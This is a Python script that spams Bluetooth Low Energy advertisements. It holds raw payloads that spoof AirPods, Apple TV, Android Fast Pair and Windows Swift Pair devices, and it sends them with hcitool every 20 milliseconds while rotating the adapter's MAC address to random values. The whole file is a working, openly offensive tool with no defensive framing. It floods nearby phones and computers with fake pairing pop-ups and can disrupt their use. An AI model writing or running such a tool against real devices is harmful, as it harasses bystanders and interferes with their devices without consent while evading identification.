import os, time, random, string

attacks = {
    "airpods": "1e ff 06 00 01 09 20 02 d5 50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
    "android": "03 03 2d fe 06 16 2d fe 00 00 00 00",
    "windows": "1e ff 06 00 03 00 80 d6 fe f2 11 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00",
    "appletv": "1e ff 06 00 01 09 20 16 d5 50 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"
}

def set_mac(dev):
    mac = "00:%02x:%02x:%02x:%02x:%02x" % (random.randint(0,255), random.randint(0,255), random.randint(0,255), random.randint(0,255), random.randint(0,255))
    os.system(f"sudo hciconfig {dev} hw ether {mac} >/dev/null 2>&1")
    return mac

def run_spam(dev="hci0"):
    count = 0
    while True:
        try:
            name = "ble-" + "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
            hex_name = " ".join([hex(ord(c))[2:] for c in name])
            name_pkt = f"02 01 06 {hex(len(name)+1)[2:]} 09 {hex_name}"
            
            mode = random.choice(list(attacks.values()) + [name_pkt])
            cur_mac = set_mac(dev)
            
            os.system(f"sudo hcitool -i {dev} cmd 0x08 0x000a 00 >/dev/null 2>&1")
            os.system(f"sudo hcitool -i {dev} cmd 0x08 0x0006 20 00 20 00 03 00 00 00 00 00 00 00 00 07 00 >/dev/null 2>&1")
            os.system(f"sudo hcitool -i {dev} cmd 0x08 0x0008 {mode} >/dev/null 2>&1")
            os.system(f"sudo hcitool -i {dev} cmd 0x08 0x000a 01 >/dev/null 2>&1")
            
            count += 1
            print(f"sent: {count} | mac: {cur_mac} | data: {mode[:20]}...")
            time.sleep(0.02)
        except KeyboardInterrupt:
            os.system(f"sudo hcitool -i {dev} cmd 0x08 0x000a 00 >/dev/null 2>&1")
            break

if __name__ == "__main__":
    run_spam()
